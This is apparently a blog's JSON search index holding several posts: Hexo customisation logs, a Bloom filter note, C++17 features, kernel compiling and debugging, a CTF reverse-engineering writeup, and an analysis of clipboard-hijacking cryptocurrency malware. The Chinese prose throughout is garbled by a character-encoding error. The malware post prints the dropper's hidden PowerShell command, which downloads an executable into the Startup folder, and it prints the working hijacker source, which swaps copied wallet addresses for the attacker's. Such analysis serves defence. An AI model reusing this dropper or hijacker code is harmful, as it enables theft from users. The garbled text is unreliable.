¼ä¹Ÿä¸å¤ªéœ€è¦é€™äº›è³‡è¨Šï¼Œæ‰€ä»¥å°±æ‹”æ‰äº†ï¼Œè©¦ç”¨ä¸€ä¸‹è€Œå·²xD SEO Defer offscreen images åƒè€ƒ Lazy load offscreen images with lazysizesï¼Œåªè¦è¼‰å…¥ lazysizes é€™å€‹ scripts é€²ä¾†ï¼Œç„¶å¾ŒæŠŠ src æ”¹æˆ data-src ä¸¦åŠ ä¸Š class=&quot;lazyload&quot; å°±å¥½äº† è¨»å†Šå€‹ hexo çš„ after_renderï¼ŒæŠŠæ‰€æœ‰ img tag æŠ“å‡ºä¾†æ”¹å°±å®Œäº‹äº† scripts/lazy-load-image.js123hexo.extend.filter.register('after_render:html', function (htmlContent) { return htmlContent.replace(/&lt;img src=&quot;([^&quot;]*)&quot; (?:class=&quot;([^&quot;]*)&quot;)?([^&gt;]*)&gt;/, '&lt;img data-src=&quot;$1&quot; class=&quot;$2 lazyload&quot; $3&gt;')}); lazysizes æœ‰ cdnï¼Œå¾ˆæ–¹ä¾¿çš„ layout/common/scripts.ejs1&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.2.0/lazysizes.min.js&quot; defer&gt;&lt;/script&gt; Sitemap 1npm install hexo-generator-sitemap è£å¥½ hexo-generator-sitemap ä¹‹å¾Œï¼Œåœ¨ _config.yml åŠ ä¸€è¡Œæ”¶å·¥ 12sitemap: path: sitemap.xml Robots.txt ç›´æ¥æ”¾åœ¨ source/_posts ä¸‹é¢å°±è¡Œäº†ï¼Œç°¡å–®æå®š","link":"/2020/02/08/blog01/"},{"title":"ã€éƒ¨è½æ ¼é–‹ç™¼æ—¥èªŒã€‘0x02","text":"Admonition æˆ‘æŠŠ Material for MkDocs - Admonition Extension æ¬éä¾†å•¦ï¼Œå› ç‚ºå¯¦åœ¨å¤ªå¥½çœ‹ï¼Œå°±æ¬éä¾†ç”¨äº†ï¼Œä¸¦ä¸”åšäº†ä¸‹é¢å…©å€‹å°æ”¹å‹• æŠŠ border-radius æ‹”æ‰äº†ï¼Œé‚„æ˜¯æ–¹çš„å¥½çœ‹ é™°å½±æ”¹æ·¡äº†ï¼Œæ„Ÿè¦ºæ¯”è¼ƒå° exampleé€™æ˜¯ç¯„ä¾‹ noteé€™æ˜¯ç¯„ä¾‹ abstracté€™æ˜¯ç¯„ä¾‹ infoé€™æ˜¯ç¯„ä¾‹ tipé€™æ˜¯ç¯„ä¾‹ successé€™æ˜¯ç¯„ä¾‹ questioné€™æ˜¯ç¯„ä¾‹ warningé€™æ˜¯ç¯„ä¾‹ failureé€™æ˜¯ç¯„ä¾‹ dangeré€™æ˜¯ç¯„ä¾‹ quoteé€™æ˜¯ç¯„ä¾‹ å¯¦ä½œ å¾ hexo-tag-admonition å€Ÿ code éä¾†æ”¹ åŸºæœ¬ä¸Šå°±æ˜¯ register ä¸€å€‹æ–°çš„ hexo tagï¼Œç„¶å¾Œç”¨åˆ°äº† details å’Œ summary é€™å…©å€‹ html5 æ–°çš„ tag æ”¹çš„æ™‚å€™æœ‰å¹¾å€‹å°åœ°æ–¹è¦æ³¨æ„ details tag åŸæœ¬å°±æœ‰ä¸€å€‹ç®­é ­ä½†æ˜¯å¾ˆé†œï¼Œåœ¨ summary::-webkit-details-marker è¨­å®š display:none æ‹”æ‰ä»– icon ç”¨åˆ°äº† font-family: Material Iconsï¼Œè¦åœ¨ head è£¡é¢åŠ å€‹å­—é«” Code block å¦ä¸€å€‹æ”¹å‹•æ˜¯ç¨‹å¼ç¢¼å€å¡Šçš„éƒ¨åˆ†ï¼ŒåŸä¾†çš„æœ‰é»å°é†œï¼Œå°±æ”¹äº†å¹¾ä¸‹ æ²’æœ‰çµ¦æª”åå°±ä¸è¦é¡¯ç¤ºä¸Šé¢çš„ header å¯ä»¥æŒ‡å®šèµ·å§‹è¡Œæ•¸ï¼Œä»¥åŠæŒ‡å®šæ¨™è¨˜ç‰¹å®šè¡Œæ•¸ï¼Œå¦‚ä¸‹ç¯„ä¾‹ 1python run.py &gt;3,6 run.py >3,6123456import mathdef main(): print(f'test {math.factorial(5)}')main()","link":"/2020/02/22/blog02/"},{"title":"ã€éƒ¨è½æ ¼é–‹ç™¼æ—¥èªŒã€‘0x03","text":"éƒ¨è½æ ¼è¦æ¢å¾©æ›´æ–°å•¦ è·é›¢ä¸Šæ¬¡æ›´æ–°ä¹Ÿéäº†ä¸€å¹´å¤šäº†ï¼ŒæœŸé–“ç‚ºäº†æ›´åŠ å®¢è£½åŒ–ä¸»é¡Œï¼Œé‚„æƒ³éè¦è‡ªå·±å¾é ­åˆ»éƒ¨è½æ ¼ï¼ŒçœŸæ˜¯å¤ªå¤©çœŸäº†å•Š æœ€å¾Œé‚„æ˜¯å›ä¾†ç”¨æ–°ç‰ˆçš„ icarus ä¸»é¡Œï¼ŒçœŸé¦™ã€‚ ä¹‹å‰æ˜¯æŠŠ icarus ä¸»é¡Œè·Ÿéƒ¨è½æ ¼ç¶åœ¨åŒå€‹ repo ä¸€èµ·æ›´æ–°ï¼Œä½†é€™æ¨£ä¸å¥½ç®¡ç†ï¼Œæ‰€ä»¥ç¾åœ¨å°±ç›´æ¥ fork ä¸€ä»½å‡ºä¾†ç¶­è­·ï¼Œæ˜¯ç”¨æœ€ç‰ˆçš„ 5.0.0-rc.1ï¼Œä¹‹å¾Œæœ‰æ–°ç‰ˆæœ¬å°±å† merge é€²ä¾†å°±å¥½äº†ã€‚æŠŠä¹‹å‰åšéå¾—ä¸€äº›æ”¹å‹•éƒ½æ•´åˆé€²ä¸»é¡Œäº†ï¼Œé‚„æ˜¯è‡ªå·±å®¢è£½åŒ–éå¾—æœ€å°å‘³å•Šã€‚ ä¹‹å¾Œæœƒæ…¢æ…¢æŠŠä¹‹å‰çš„æ–‡ç« å†æ”¾å›ä¾†ï¼Œæ‡‰è©²è‡³å°‘ä¸€é€±ä¸€æ›´å§ï¼Œå¸Œæœ›xD icarus å¤§æ”¹ç‰ˆ æˆ‘ä¹‹å‰ç”¨çš„ icarus ç‰ˆæœ¬é‚„åœ¨å¯« .ejs ç¾åœ¨å·²ç¶“åœ¨å¯« .jsx äº† ä¹‹å‰çš„éƒ¨è½æ ¼é–‹ç™¼æ—¥èªŒä¸Šçš„ç¨‹å¼ç¢¼æœ‰äº›å¯èƒ½éƒ½ä¸èƒ½ç›´æ¥å¥—ç”¨äº† ä¸éä¸ç”¨æ“”å¿ƒæˆ‘ç¾åœ¨å·²ç¶“æŠŠæˆ‘æ”¹çš„ç¨‹å¼ç¢¼æ¨åˆ° é€™è£¡ äº† Excerpt æˆ‘ç™¼ç¾ icarus çš„ excerpt å¯ä»¥å¯«åœ¨æ–‡ç« å…§å®¹çš„é–‹é ­ï¼Œè€Œä¸ç”¨å¯«åœ¨ front matter ä¸­é–“åŠ ä¸€å€‹ &lt;!-- more --&gt; å’Œæ–‡ç« ä¸»é«”å€éš” åƒæ˜¯ä¸‹é¢é€™æ¨£ï¼Œæˆ–æ˜¯çœ‹é€™è£¡ç¯„ä¾‹ 12345Hello, this is the excerpt&lt;!-- more --&gt;This is the article é€™æ¨£ excerpt ä¹Ÿå¯ä»¥å¿«æ¨‚å¯« markdown åœ¨é¦–é ä¹Ÿåªæœƒé¡¯ç¤ºåˆ° &lt;!-- more --&gt; ä¹‹å‰çš„å…§å®¹ ä½†æ˜¯é» Read More çš„æŒ‰éˆ•è·³é€²å»æ–‡ç« ä¹‹å¾Œï¼Œæœƒç™¼ç¾ excerpt å…¶å¯¦é‚„åœ¨ åªæ˜¯é é¢æœƒæ²å‹•åˆ° #more é€™å€‹ hashtag ä¹Ÿå°±æ˜¯æ–‡ç« ä¸»é«”çš„é–‹é ­ ä¸éé€™æ¨£æ„Ÿè¦ºåªæ˜¯ä¸€å€‹å·æ‡¶çš„ä½œæ³•ï¼Œä¸æ˜¯ä¸€å€‹å®Œç¾çš„ä½œæ³•","link":"/2022/03/30/blog03/"},{"title":"ã€æ¼”ç®—æ³•ç­†è¨˜ã€‘Bloom Filter","text":"Bloom Filter ç”¨ä¾†å¿«é€Ÿæœå°‹è³‡æ–™æ˜¯å¦å­˜åœ¨æ–¼è³‡æ–™åº« æˆ‘å€‘çš„è³‡æ–™åº«æ˜¯ä¸€å€‹ $2^m$ å¤§å°çš„é™£åˆ— 1db = [False] * (2 ** m) åŠ è³‡æ–™é€²è³‡æ–™åº« æˆ‘å€‘æœ‰ $k$ å€‹ hash function çš„è¼¸å‡ºéƒ½æ˜¯ä¸€å€‹ $m$ bits çš„æ•¸ ( $&lt; 2^m$ ) æŠŠè³‡æ–™ $x$ åŠ é€²è³‡æ–™åº«å°±æ˜¯ç­‰æ–¼ï¼Œå°‡ $x$ çš„å„å€‹é›œæ¹Šå€¼çš„ä½ç½®è¨­æˆ True 12for i in range(k): db[hash[k](x)] = True æŸ¥è©¢è³‡æ–™æ˜¯å¦åœ¨è³‡æ–™åº«è£¡ æŸ¥è©¢è³‡æ–™ $x$ æ˜¯å¦åœ¨è³‡æ–™åº«è£¡ 1234if all([db[hash[k](x)] for i in range(k)]): # è³‡æ–™ x å¯èƒ½åœ¨è³‡æ–™åº«è£¡else: # è³‡æ–™ x ä¸€å®šä¸åœ¨è³‡æ–™åº«è£¡ http://www.evanlin.com/BloomFilter/ http://bryanpendleton.blogspot.com/2011/12/three-papers-on-bloom-filters.html","link":"/2018/09/11/bloom-filter/"},{"title":"ã€ç¨‹å¼èªè¨€ã€‘What&#39;s new in C++17","text":"Structured Bindings 1auto [a, b, c] = tuple('a', 1, 0.5); 12345map&lt;int, int&gt; mymap = {{1, 2}, {3, 4}};for (const auto&amp; [key, value] : mymap) { // ...} 123for (auto [a, b] = tuple(0, 'a'); a &lt; 5; a++) { // ...} Template Argument Deduction c++171auto p = pair(2, 4.5); c++141auto p = pair&lt;int, double&gt;(2, 4.5); Selection Initialization 123if (auto a = getval(); a &lt; 10) { // ...} 123switch (auto ch = getnext(); ch) { // ...} https://www.fluentcpp.com/2018/06/19/3-simple-c17-features-that-will-make-your-code-simpler/ https://hackernoon.com/a-tour-of-c-17-if-constexpr-3ea62f62ff65 https://stackoverflow.com/questions/38060436/what-are-the-new-features-in-c17","link":"/2019/01/06/c++17/"},{"title":"Clipboard hijacking cryptocurrency malware on tradingview.com","text":"æœ€è¿‘åœ¨ tradingview.com ä¸Šé¢çœ‹åˆ°é€™ç¯‡ Idea EOS - footprints of institutional moneyï¼Œçœ‹èµ·ä¾†åƒæ˜¯æ­£å¸¸çš„åˆ†æè¶¨å‹¢èµ°å‘çš„ Ideaï¼Œä½†æ˜¯ä¸‹é¢ç•™è¨€æœ‰ä¸€å€‹é€£çµ mycryptorush.com/signalsï¼Œèªªæ˜¯å¯ä»¥å¾—åˆ°å…è²»çš„ bitcoin å’Œäº¤æ˜“è¶¨å‹¢è¨Šè™Ÿã€‚ é»ä¸‹å»å…¶å¯¦æ˜¯å°å‘ tinyurl.com/cryptorushsignalsï¼Œé€™å€‹çŸ­ç¶²å€åˆæ˜¯å°å‘ https://bbuseruploads.s3.amazonaws.com/7e1f7e0b...ï¼Œæœƒä¸‹è¼‰ CryptoRushSignals.zip ä¸‹ä¾†ã€‚çœ‹èµ·ä¾†å°±å¾ˆå¯ç–‘ï¼Œæ˜æ˜çœ‹èµ·ä¾†æ˜¯è¦å»ä¸€å€‹ç¶²ç«™ï¼Œå»è¼‰äº†æª”æ¡ˆä¸‹ä¾†ã€‚è§£å£“ç¸®è©² zip æª”ä¹‹å¾Œæœ‰å…©å€‹æª”æ¡ˆ HOWTOUSE.txt å’Œ CryptoRushSignals.run.lnkã€‚ HOWTOUSE.txt12Open CryptoRushSignals.run, this will open up a website were you can register.It then automatically will open up an excel sheet with the live current signals. ç´”æ–‡å­—çš„èªªæ˜æ–‡ä»¶ï¼Œå«ä½ åŸ·è¡Œ CryptoRushSignals.runï¼ŒçœŸçš„å»åŸ·è¡Œä¹‹å¾Œï¼Œæœƒè·³å‡ºç€è¦½å™¨ç€è¦½ https://t.me/MyCryptoradarï¼Œè®“ä½ åŠ å…¥ä¸€å€‹ telegram ç¾¤çµ„ï¼Œå°±å¯ä»¥æ”¶åˆ°ä¸€äº›æŒ‡æ¨™æ•¸æ“šçš„è®ŠåŒ–é€šçŸ¥ï¼Œè£¡é¢ç¾åœ¨æœ‰ 400 å¤šäººã€‚ é™¤äº†æ‰“é–‹ç€è¦½å™¨å«ä½ åŠ ç¾¤çµ„ä¹‹å¤–ï¼Œä»–é‚„ç§˜å¯†åŸ·è¡Œäº†ä¸‹é¢é€™æ®µ payload 1&quot;C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot; -nop -w hidden [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Start-Process -FilePath &quot;https://t.me/MyCryptoradar; Invoke-WebRequest -Uri &quot;https://bitbucket.org/cryptorushh/cryptorush/downloads/pcmoni.png&quot; -OutFile C:\\Users\\$env:UserName\\AppData\\Roaming\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\pclp.exe åŸºæœ¬ä¸Šå°±æ˜¯å» bitbucket ä¸‹è¼‰ https://bitbucket.org/cryptorushh/cryptorush/downloads/pcmoni.png é€™å€‹ pngï¼Œç„¶å¾Œæ”¾åˆ°é–‹æ©Ÿè‡ªå‹•åŸ·è¡Œçš„è·¯å¾‘ï¼Œè€Œä¸”é€™å€‹ä¹Ÿä¸æ˜¯ pngï¼Œä»–å°±æ˜¯ä¸€éš» PE åŸ·è¡Œæª”ã€‚ ç¨å¾®çœ‹ä¸€ä¸‹é‚£éš» PE åŸ·è¡Œæª”å¾Œï¼Œç™¼ç¾ä»–æ˜¯ç”¨ py2exe åŒ…çš„ï¼Œé‚£å°±ç”¨ unpy2exe æ‹†å› pycï¼Œå†ç”¨ uncompyle6 å°±å¯ä»¥æ‹†å‡ºåŸæœ¬çš„ python script äº†ã€‚ 8.61.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# uncompyle6 version 3.7.2# Python bytecode 2.7 (62211)# Decompiled from: Python 2.7.15 (default, Dec 23 2019, 14:00:59) # [GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.4)]# Embedded file name: 8.61.py# Compiled at: 2020-08-15 23:23:49from __future__ import print_functionimport sysoo000 = sys.version_info[0] == 2ii = 2048oOOo = 7def O0(ll_opy_): o0O = ord(ll_opy_[(-1)]) iI11I1II1I1I = ll_opy_[:-1] oooo = o0O % len(iI11I1II1I1I) iIIii1IIi = iI11I1II1I1I[:oooo] + iI11I1II1I1I[oooo:] if oo000: o0OO00 = unicode().join([ unichr(ord(oo) - ii - (i1iII1IiiIiI1 + o0O) % oOOo) for i1iII1IiiIiI1, oo in enumerate(iIIii1IIi) ]) else: o0OO00 = str().join([ chr(ord(oo) - ii - (i1iII1IiiIiI1 + o0O) % oOOo) for i1iII1IiiIiI1, oo in enumerate(iIIii1IIi) ]) return eval(o0OO00)import time, re, pyperclip, subprocessif 0: ooOoO0O00 * IIiIiII11iif 0: oOo0O0Ooo * I1ii11iIi11idef I1IiI(): while 0 &lt; 1: try: o0OOO = None if 0: ooOo + Oo o0OIiiIII111iI = subprocess.Popen(['C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'Get-Clipboard'], stdout=subprocess.PIPE, startupinfo=IiII) o0OOO = str(o0OIiiIII111iI.stdout.read()).strip().decode('utf-8').rstrip(u'\\x00') if o0OOO != iI1Ii11111iIi and o0OOO != i1i1II: if re.match(O0oo0OO0, str(o0OOO)): pyperclip.copy(iI1Ii11111iIi) pyperclip.paste() elif re.match(I1i1iiI1, str(o0OOO)): pyperclip.copy(i1i1II) pyperclip.paste() except Exception as iiIIIII1i1iI: print(iiIIIII1i1iI) time.sleep(1) if 0: o00ooo0 / Oo00O0 returnif __name__ == O0(u'\\u0829\\u0862\\u0863\\u0872\\u0867\\u0869\\u086f\\u0861\\u0862\\u082b\\u0805'): i1i1II = '0x22f338FC26Ea71EC884256C29103122c4578EE27' iI1Ii11111iIi = '14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS' O0oo0OO0 = '^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$' I1i1iiI1 = '^(0x)?[0-9a-fA-F]{40}$' time.sleep(15) IiII = subprocess.STARTUPINFO() IiII.dwFlags |= subprocess.STARTF_USESHOWWINDOW I1IiI() if 0: o0oooOoO0 if 0: IiIii1Ii1IIi / O0Oooo00.oo00 * I11 if 0: I1111 * o0o0Oo0oooo0 / I1I1i1 * oO0 / IIIi1i1I# okay decompiling 8.61.py.pyc æœ‰ç¨å¾®æ··æ·†éçš„åŸå§‹ç¢¼ï¼Œé‡æ–°å‘½åä¸€ä¸‹è®Šæ•¸å°±å¯ä»¥äº†ã€‚ 123456789101112131415161718192021222324252627282930from __future__ import print_functionimport time, re, pyperclip, subprocessdef main(): while True: try: clipboard = None process = subprocess.Popen(['C:\\\\windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'Get-Clipboard'], stdout=subprocess.PIPE, startupinfo=startupinfo) clipboard = str(process.stdout.read()).strip().decode('utf-8').rstrip(u'\\x00') if clipboard != btc_address and clipboard != eth_address: if re.match(btc_address_pattern, str(clipboard)): pyperclip.copy(btc_address) pyperclip.paste() elif re.match(eth_address_pattern, str(clipboard)): pyperclip.copy(eth_address) pyperclip.paste() except Exception as err: print(err) time.sleep(1) returnif __name__ == '__main__': eth_address = '0x22f338FC26Ea71EC884256C29103122c4578EE27' btc_address = '14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS' btc_address_pattern = '^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$' eth_address_pattern = '^(0x)?[0-9a-fA-F]{40}$' time.sleep(15) startupinfo = subprocess.STARTUPINFO() startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW main() ä»–æŠŠä½ å‰ªè²¼ç°¿è£¡é¢ç¬¦åˆ bitcoin æˆ– ethereum åœ°å€æ ¼å¼çš„é€šé€šæ›æˆä»–éŒ¢åŒ…çš„ä½å€ã€‚ IOC 0x22f338FC26Ea71EC884256C29103122c4578EE27 14uJZuPNtdtDowpcoGBF14fX3uo57fbvvS","link":"/2020/08/16/clipboard-hijack/"},{"title":"ã€æ‰‹æŠŠæ‰‹æ•™ä½ ç© Kernelã€‘ç·¨è­¯ Linux Kernel","text":"åŸå§‹ç¢¼ä¸‹è¼‰ å¯ä»¥å¾ www.kernel.org ä¸‹è¼‰æœ€æ–°çš„ kernel ( æˆ‘æ˜¯ä¸‹è¼‰ 5.0.9 çš„ ) 12wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.0.9.tar.xzx linux-5.0.9.tar.xz è¨­ç½®ç·¨è­¯åƒæ•¸ 1make menuconfig æœ‰é¸å–®å¯ä»¥å®¢è£½åŒ–ï¼Œé¸å®Œä¹‹å¾Œæœƒç”¢ç”Ÿ .config ç·¨è­¯ 1make -j$(nproc) -j å¤šå€‹ç¨‹åºä¸¦è¡Œç·¨è­¯ make helpå¯ä»¥ç”¨ make help çœ‹çœ‹æœ‰å“ªäº›åƒæ•¸å¯ä»¥ç”¨ å®‰è£ 1make -j$(nproc) modules_install å®‰è£å…§æ ¸æ¨¡å¡Š ( kernel module ) æœƒè£åˆ° /lib/modules/ 1make -j$(nproc) install å®‰è£å…§æ ¸æœ¬é«” æœƒè£åˆ° /boot ä¸¦ä¸”æœƒè‡ªå‹•æ›´æ–° grub ä¸‹æ¬¡é‡å•Ÿç³»çµ±å°±æœƒæ˜¯æ–°çš„å…§æ ¸ å®‰è£åˆ°å…¶ä»–ç›®éŒ„1export INSTALL_PATH=/path/to/install https://www.cyberciti.biz/tips/compiling-linux-kernel-26.html https://stackoverflow.com/questions/35931157/change-linux-kernel-installation-directory","link":"/2019/04/23/compile-kernel/"},{"title":"ã€æ‰‹æŠŠæ‰‹æ•™ä½ ç© Kernelã€‘å¦‚ä½•å° Kernel é™¤éŒ¯","text":"ç·¨è­¯ kernel åƒè€ƒ Compile Kernel initramfs 12mkdir --parents initramfs/{bin,dev,etc,lib,lib64,mnt/root,proc,root,sbin,sys}cp `which busybox` initramfs/bin/ busybox æ˜¯é›†æˆäº†å¾ˆå¤šå¸¸ç”¨ linux å‘½ä»¤çš„å·¥å…· æ¥ä¸‹ä¾†æˆ‘å€‘éœ€è¦ç·¨è¼¯å…©å€‹æª”æ¡ˆï¼Œinitramfs/init å’Œ initramfs/etc/passwd init tab123456789101112131415#!/bin/busybox sh/bin/busybox mkdir -p /usr/sbin /usr/bin /sbin /bin/bin/busybox --install -smount -t proc none /procmount -t sysfs none /sysln -s /dev/console /dev/ttyS0sleep 2setsid cttyhack su rootpoweroff -f kernel è·‘èµ·ä¾†çš„æ™‚å€™æœƒæª¢æŸ¥æ˜¯å¦æœ‰ initramfsï¼Œæœ‰çš„è©±å°±æœƒæŠŠå®ƒ mount åœ¨ / ç„¶å¾Œè·‘ /init passwd tab1root:x:0:0::/root:/bin/sh æ‰“åŒ… 12cd initramfsfind . -print0 | cpio --null --create --verbose --format=newc | gzip --best &gt; ../initramfs.cpio.gz qemu-system tab123456#!/bin/bashqemu-system-x86_64 -kernel ./linux-5.0.9/arch/x86_64/boot/bzImage \\ -initrd ./initramfs.cpio.gz \\ -nographic \\ -append &quot;console=ttyS0 nokaslr&quot; \\ -gdb tcp:127.0.0.1:7777 nokaslr é—œæ‰ kernel çš„ä½å€éš¨æ©ŸåŒ–ï¼Œæ–¹ä¾¿æˆ‘å€‘é™¤éŒ¯ -gdb é–‹ä¸€å€‹ gdb server è®“æˆ‘å€‘å¯ä»¥é€£ä¸Šå»é™¤éŒ¯ å¦‚ä½•è·³å‡º qemu-systemCtrl-A X gdb 12345678(gdb) target remote :7777(gdb) set auto-load safe-path .(gdb) file ./linux-5.0.9/vmlinux(gdb) apropos lx # é¡¯ç¤ºåŒ…å« lx çš„æŒ‡ä»¤ ( å¾ vmlinux-gdb.py è¼‰å…¥çš„è¼”åŠ©å‡½å¼ )lx-cmdline -- Report the Linux Commandline used in the current kernellx-cpus -- List CPU status arrayslx-dmesg -- Print Linux kernel log buffer... å› ç‚º gdb æœƒè‡ªå‹•è¼‰å…¥ä¸€äº›æª”æ¡ˆï¼Œä½†æœ‰äº›æª”æ¡ˆå¯èƒ½æ˜¯ä¸å¯ä¿¡ä»»çš„ set auto-load safe-path å°±æ˜¯è¨­å®šå¯ä»¥ä¿¡ä»»çš„è·¯å¾‘ï¼Œåº•ä¸‹çš„æª”æ¡ˆæœƒè‡ªå‹•è¼‰å…¥ï¼Œæ¯”å¦‚èªªä¸€äº› python script é€™è£¡æˆ‘å€‘è¦è¼‰å…¥çš„æ˜¯ ./linux-5.0.9/vmlinux-gdb.py https://blog.csdn.net/DrottningholmEast/article/details/76651580 https://wiki.gentoo.org/wiki/Custom_Initramfs http://nickdesaulniers.github.io/blog/2018/10/24/booting-a-custom-linux-kernel-in-qemu-and-debugging-it-with-gdb/ https://blog.csdn.net/chrisniu1984/article/details/3907874","link":"/2019/04/23/debug-kernel/"},{"title":"ã€CTF Writeupsã€‘VolgaCTF Quals 2020 - F-Hash","text":"é€™é¡Œçµ¦äº†ä¸€å€‹ x86-64 ELF Executableï¼Œç›´æ¥è·‘ä¸‹å»è·‘ä¸å‡ºä¾†ï¼Œä¸€ç›´å¡åœ¨é‚£è£¡ï¼Œé€†å‘ä¸€ä¸‹æœƒç™¼ç¾ 13B0 é€™å€‹å‡½å¼æ˜¯ä¸€å€‹éè¿´å‡½å¼ï¼Œä»–çš„è™›æ“¬ç¢¼å¤§æ¦‚é•·ä¸‹é¢é€™æ¨£ï¼Œæœƒä¸€ç›´éè¿´å‘¼å«å‰å…©å±¤çš„ç­”æ¡ˆï¼Œå¾ˆæ˜é¡¯çš„æœ‰å¾ˆå¤šé‡è¤‡çš„å­å•é¡Œï¼Œé€™æ™‚å€™å°±æ˜¯è¦ç”¨ Dynamic Programming çš„æ€è·¯ä¾†æŠŠç®—éçš„ç­”æ¡ˆè¨˜ä¸‹ä¾†å°±ä¸æœƒè·‘é‚£éº¼ä¹…äº†ï¼Œæ‰€ä»¥é€™é¡Œå°±æ˜¯è¦å„ªåŒ–é€™å€‹å‡½å¼ï¼ŒæŠŠç¨‹å¼è·‘å®Œå°±æœƒå°å‡º flagã€‚ 12345def _13B0(depth, a, b): ... r1 = _13B0(depth - 1, a, b) r2 = _13B0(depth - 2, a, b) ... ä»¥ä¸‹æä¾›ä¸‰ç¨®è§£æ³•ï¼Œè®€è€…å¯ä»¥è·Ÿè‘—ç·´ç¿’ä¸€ä¸‹ã€‚ Rewrite Function with Python æœ€ç›´è¦ºçš„æ–¹æ³•å°±æ˜¯æŠŠ IDA decompile å‡ºä¾†çš„ code æ¬åˆ° python ä¸Šé‡å¯«ä¸€ä¸‹ï¼Œæ²’ä»€éº¼æŠ€è¡“ï¼Œé€™æ˜¯æˆ‘åœ¨è³½ä¸­ç”¨çš„æ–¹æ³•ï¼Œä½†å°±æ˜¯è¦æ³¨æ„ä¸€ä¸‹å‹æ…‹çš„å•é¡Œï¼Œæ¯”å¦‚å…©å€‹ unsigned int ç›¸ä¹˜å¯èƒ½ overflow åœ¨ python è£¡é¢è¦ mod (1 &lt;&lt; 32)ï¼Œæ›´å¤šç´°ç¯€è«‹çœ‹ä¸‹é¢çš„ç¨‹å¼ç¢¼ã€‚ solve-rewrite.py123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python3table = [0]for i in range(26): table += [i * 10 + 1 + (0xf6 &lt;&lt; 120)] * 10def bitcountsum(a, b): a %= (1 &lt;&lt; 64) b %= (1 &lt;&lt; 64) return bin(a).count('1') + bin(b).count('1')def calc(a, b, depth = 256): ans = [0] ans.append((bitcountsum(a, b), 0, 0)) ans.append((bitcountsum(a ^ 1, b), 0, 1)) for i in range(3, depth + 1): v15, v16 = ans[i - 1], ans[i - 2] v13 = ((v15[0] + v15[1] * (1 &lt;&lt; 64)) + (v16[0] + v16[1] * (1 &lt;&lt; 64)) + bitcountsum((v15[2] + v16[2]) ^ a, b)) % (1 &lt;&lt; 128) v14 = table[i] while True: if (v14 &gt;&gt; 64) &gt; (v13 &gt;&gt; 64): break if (v14 &gt;&gt; 64) == (v13 &gt;&gt; 64): if v14 % (1 &lt;&lt; 64) &gt;= v13 % (1 &lt;&lt; 64): break k = max(1, (v13 &gt;&gt; 64) // (v14 &gt;&gt; 64)) v13 = (v13 - k * v14) % (1 &lt;&lt; 128) ans.append((v13 % (1 &lt;&lt; 64), (v13 &gt;&gt; 64), (v15[2] + v16[2]) % (1 &lt;&lt; 64))) return ansal = [0x6369757120656854, 0x706d756a20786f66, 0x20797a616c206568, 0]bl = [0x206e776f7262206b, 0x74207265766f2073, 0x80676f64, 0x2b]for a, b in zip(al, bl): print(list(map(hex, calc(a, b)[256]))) GDB å¦ä¸€å€‹æ–¹æ³•æ˜¯æˆ‘åœ¨è³½å¾Œçœ‹ åˆ¥äºº ç”¨çš„ï¼Œåœ¨ gdb å¯« python å» hook 13B0 çš„é–‹é ­å’Œçµå°¾ï¼Œåœ¨é–‹é ­åˆ¤æ–·é€™çµ„åƒæ•¸æœ‰æ²’æœ‰å‡ºç¾éäº†ï¼Œè·‘éå°±æŠŠåƒæ•¸çš„ depth è¨­æˆ 1 ä¹Ÿå°±æ˜¯ base case è®“ä»–ä¸è¦å†å¾€ä¸‹éè¿´äº†ï¼Œè€Œå› ç‚ºåŒä¸€çµ„å‡½å¼çš„ Start, End Hook æ²’è¾¦æ³•å…±äº«è³‡è¨Šï¼Œæ‰€ä»¥éœ€è¦ç¶­è­·ä¸€å€‹ state ä¾†æ”¾ç›®å‰çš„åƒæ•¸ï¼Œåœ¨çµå°¾çš„æ™‚å€™ä¸€æ¨£æ˜¯çœ‹é€™çµ„åƒæ•¸æœ‰æ²’æœ‰å‡ºç¾éï¼Œæœ‰å°±æŠŠç­”æ¡ˆå¯«ä¸Šå»ï¼Œæ²’æœ‰å°±æŠŠç­”æ¡ˆå­˜èµ·ä¾†ä¸‹æ¬¡å°±ä¸æœƒå†è·‘ä¸€æ¬¡äº†ã€‚ solve-gdb.py12345678910111213141516171819202122232425262728293031323334353637383940import gdbdef register(name): return int(gdb.parse_and_eval(name))def read(address, size): inf = gdb.inferiors()[0] return inf.read_memory(address, size).tobytes()def write(address, buf): inf = gdb.inferiors()[0] inf.write_memory(address, buf)memory = {}state = []class Start(gdb.Breakpoint): def __init__(self, location): super(Start, self).__init__(spec = location, type = gdb.BP_BREAKPOINT, internal = False, temporary = False) def stop(self): state.append((register('$rdi'), register('$rsi'), register('$rdx'), register('$rcx'))) if memory.get(state[-1][1:]) is not None: gdb.execute('set $rsi = 1')class End(gdb.Breakpoint): def __init__(self, location): super(End, self).__init__(spec = location, type = gdb.BP_BREAKPOINT, internal = False, temporary = False) def stop(self): global state buf, h = state[-1][0], state[-1][1:] if memory.get(h) is None: memory[h] = (read(buf, 8), read(buf + 8, 8), read(buf + 16, 8)) else: write(buf, memory[h][0]) write(buf + 8, memory[h][1]) write(buf + 16, memory[h][2]) state = state[:-1]Start(f'*{0x0000555555554000 + 0x13b0}')End(f'*{0x0000555555554000 + 0x1424}') gdb f-hash ä¹‹å¾Œï¼Œåœ¨ gdb è£¡é¢åŸ·è¡Œ source solve-gdb.py å°±å¯ä»¥è·‘ä¸Šé¢çš„ç¨‹å¼ç¢¼äº† æˆ–æ˜¯ä¹Ÿå¯ä»¥åœ¨åŸ·è¡Œ gdb çš„æ™‚å€™å°±è¼‰å…¥ gdb -x solve-gdb.py f-hash Frida 